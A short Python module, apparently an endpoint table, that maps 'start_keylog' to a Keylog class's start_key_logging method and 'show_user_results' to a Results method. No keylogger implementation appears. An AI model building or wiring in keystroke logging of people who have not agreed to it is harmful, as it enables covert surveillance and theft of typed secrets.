from core.apps import Keylog, Results


endpoints = {
    'start_keylog': Keylog().start_key_logging,
    'show_user_results': Results().show_user_results_for,
}
